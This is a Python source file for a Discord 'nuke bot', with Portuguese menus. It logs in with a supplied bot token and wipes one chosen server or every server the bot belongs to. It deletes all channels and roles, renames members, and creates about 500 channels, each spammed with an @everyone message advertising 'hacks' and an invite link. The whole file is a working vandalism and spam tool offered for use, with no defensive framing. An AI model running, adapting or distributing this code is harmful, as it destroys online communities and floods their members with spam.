import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import time

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')

def _input(text):
    print(text, end='')
    return input()

baner = f'''
{r}██████╗     ██╗  ██╗
{r}██╔══██╗    ██║ ██╔╝
{r}██║  ██║    █████╔╝ 
{r}██║  ██║    ██╔═██╗ 
{r}██████╔╝    ██║  ██╗
{r}╚═════╝     ╚═╝  ╚═╝
{y}Feito por: {g}Menor dk
'''

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def rename_all_members(guild, name):
    renamed = 0
    for member in guild.members:
        if not member.guild_permissions.administrator:
            try:
                await member.edit(nick=f'{name} ({member.name})')
                renamed += 1
            except:
                continue
    return renamed

async def create_text_channels(guild, name, message):
    created = 0
    for _ in range(10):  # Cria 10 canais por vez
        try:
            channel = await guild.create_text_channel(name=name)
            await channel.send(message)  # Envia mensagem no canal criado
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild, name, message):
    print(f'{r}Nuke: {m}{guild.name}')
    
    # Renomeia membros
    renamed = await rename_all_members(guild, name)
    print(f'{m}Renomeados: {b}{renamed}')
    
    # Deleta canais
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Canais deletados: {b}{deleted_channels}')
    
    # Deleta roles
    deleted_roles = await delete_all_roles(guild)
    print(f'{m}Roles deletados: {b}{deleted_roles}')
    
    # Cria canais de texto
    created_channels = 0
    while created_channels < 500:
        created = await create_text_channels(guild, name, message)
        created_channels += created
        print(f'{m}Canais criados: {b}{created_channels}')
        time.sleep(1)  # Atraso para evitar problemas
    
    print(f'{r}--------------------------------------------\n\n')

def main():
    clear()
    choice = _input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Executar Setup Nuke Bot
    {y}└─[2] {m}- {g}Sair
    {y}└─[3] {m}- {g}Parar
{y}====>{g}''')
    
    if choice == '1':
        token = _input(f'{y}Insira o token do bot:{g}')
        name = _input(f'{y}Insira o nome para os canais criados:{g}')
        message = '''# DKZIN 🔥🥋🇾🇪
> - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
- https://discord.com/invite/gZSx3n8Csa

> TEMOS OTIMOS HACKS E METHODOS 
> BOTS DE KEY E MUITO MAIS

@here @everyone'''
        
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Selecione]
    {y}└─[1] {m}- {g}Nuke de todos os servidores.
    {y}└─[2] {m}- {g}Nuke apenas um servidor.
    {y}└─[3] {m}- {g}Sair
{y}====>{g}''')
        
        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
        
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'[+] Logado como {client.user.name}')
                print(f'[+] Bot em {len(client.guilds)} servidores!')
                for guild in client.guilds:
                    await nuke_guild(guild, name, message)
                await client.close()
        
        elif choice_type == '2':
            guild_id = _input(f'{y}Insira o id do servidor:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild, name, message)
                await client.close()
        
        elif choice_type == '3':
            print(f'{dr}Saindo...')
            exit()
        
        try:
            client.run(token)
            _input('Nuke concluído, pressione Enter para voltar ao menu...')
        except Exception as error:
            if 'Privileged Intents' in str(error):
                _input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para voltar...')
            else:
                _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
    elif choice == '2':
        print(f'{dr}Saindo...')
        exit()

if __name__ == "__main__":
    main()
